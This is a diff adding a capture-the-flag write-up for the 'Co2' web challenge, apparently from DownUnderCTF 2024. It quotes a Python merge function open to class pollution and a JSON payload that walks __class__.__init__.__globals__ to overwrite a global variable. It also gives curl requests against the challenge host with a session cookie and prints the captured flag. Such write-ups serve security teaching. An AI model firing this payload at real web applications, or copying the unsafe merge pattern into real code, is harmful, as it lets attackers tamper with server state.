@@ -235,6 +235,67 @@
   
 ----------------------------------------  
 
+### Challenge: Co2
+
+### Vulnerable code:
+
+- Vulnerable Code 1: `utils.merge()`
+
+            def merge(src, dst):
+                for k, v in src.items():
+                    if hasattr(dst, '__getitem__'):
+                        if dst.get(k) and type(v) == dict:
+                            merge(v, dst.get(k))
+                        else:
+                            dst[k] = v
+                    elif hasattr(dst, k) and type(v) == dict:
+                        merge(v, getattr(dst, k))
+                    else:
+                        setattr(dst, k, v)
+
+- The piece of code above  is vulnerable to [Python's Prototype Pollution](https://blog.abdulrah33m.com/prototype-pollution-in-python/) which allows an attacker to set special attributes of an object.
+
+- Vulnerable code snippet 2:
+
+            @app.route("/save_feedback", methods=["POST"])
+            @login_required
+            def save_feedback():
+                data = json.loads(request.data)
+                feedback = Feedback()
+                # Because we want to dynamically grab the data and save it attributes we can merge it and it *should* create those attribs for the object.
+                merge(data, feedback)
+                save_feedback_to_disk(feedback)
+                return jsonify({"success": "true"}), 200
+
+- The route `/save_feedback` receives `application/json` data and passes it to the `merge` function to handle it.This is the point that we will inject our payload.
+- The route `/get_flag` checks if variable `flag` is set to true and sends the flag.The main objective is to use `Python Prototype Pollution` to set flag to true.
+
+            @app.route("/get_flag")
+            @login_required
+            def get_flag():
+                if flag == "true":
+                    return "DUCTF{NOT_THE_REAL_FLAG}"
+                else:
+                    return "Nope"
+
+- Payload to get the flag-:```{"__class__":{"__init__":{"__globals__":{"flag":"true"}}}}```
+  
+### Exploitation
+
+- Setting the flag to "true" with `curl`
+
+      ❯ curl https://web-co2-63345e7db7737f2d.2024.ductf.dev/save_feedback -H "Cookie: session=.eJwlzjsOwyAQBcC7UKdgH-wHX8YCllXS2nEV5e6xlHqa-aQ9jnU-0_Y-rvVI-8vTltQ650nNwqxPQx6111FyjC7mQm6hKKOgSyEY11mWaraGm0ODI4QQrUnj8NooL7eqrCAwcoMSfJXJlCkcNCakC9tEFQnldEeucx3_DdL3B0tPLXg.ZrfRhQ.Pi_MCrfl3qdxciMt1p5LsUeEd0k" -H "Content-Type: application/json" -d '{"__class__":{"__init__":{"__globals__":{"flag":"true"}}}}'
+      {"success":"true"}
+
+- Getting the flag with `curl`
+
+      ❯ curl https://web-co2-63345e7db7737f2d.2024.ductf.dev/get_flag -H "Cookie: session=.eJwlzjsOwyAQBcC7UKdgH-wHX8YCllXS2nEV5e6xlHqa-aQ9jnU-0_Y-rvVI-8vTltQ650nNwqxPQx6111FyjC7mQm6hKKOgSyEY11mWaraGm0ODI4QQrUnj8NooL7eqrCAwcoMSfJXJlCkcNCakC9tEFQnldEeucx3_DdL3B0tPLXg.ZrfRhQ.Pi_MCrfl3qdxciMt1p5LsUeEd0k" 
+      DUCTF{_cl455_p0lluti0n_ftw_}%
+
+- Flag-:```DUCTF{_cl455_p0lluti0n_ftw_}```
+
+--------------------------
+
 --------------------------
 ### References:
 --------------------------
